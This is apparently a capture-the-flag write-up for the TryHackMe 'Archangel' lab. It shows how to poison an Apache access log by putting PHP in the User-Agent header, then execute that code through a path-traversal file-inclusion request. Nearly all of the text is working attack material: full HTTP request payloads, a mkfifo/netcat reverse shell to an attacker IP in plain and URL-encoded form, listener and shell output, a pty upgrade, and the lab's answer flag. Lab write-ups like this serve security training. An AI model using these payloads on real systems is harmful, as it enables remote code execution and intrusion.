https://github.com/0xNirvana/Writeups/blob/master/TryHackMe/Easy/archangel/archangel.md

From the access logs it can be seen that along with the path that we are trying to access our User-Agent is also getting logged. We can add a PHP code in the User-Agent header using Burp Suite and with the help of that gain a reverse shell.

create a custom get request with variable *cmd* containing a command to run on the system

in the user agent of the get request, inset php code that will execute a function on the system with the value of the *cmd* variable from the input URL

```
GET /test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log&cmd=whoami HTTP/1.1
Host: mafialive.thm
User-Agent: Mozilla/5.0 <?php system($_GET['cmd']); ?> (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

![[lfipoc.png]]

now substituting that *whoami* command for a reverse shell

start a listener on the attacker machine

```
nc -lvnp 1337
```

https://www.revshells.com/

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.6.24.127 1337 >/tmp/f
```


url encode it

https://www.urlencoder.org/

```
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.6.24.127%201337%20%3E%2Ftmp%2Ff
```


new get request

```
GET /test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.6.24.127%201337%20%3E%2Ftmp%2Ff HTTP/1.1
Host: mafialive.thm
User-Agent: Mozilla/5.0 <?php system($_GET['cmd']); ?> (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```


```
listening on [any] 1337 ...
connect to [10.6.24.127] from (UNKNOWN) [10.10.93.86] 48340
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ uname -a
Linux ubuntu 4.15.0-123-generic #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
$ 
```


upgrade the shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

/home/archangel/user.txt

```
thm{lf1_t0_rc3_1s_tr1cky}
```

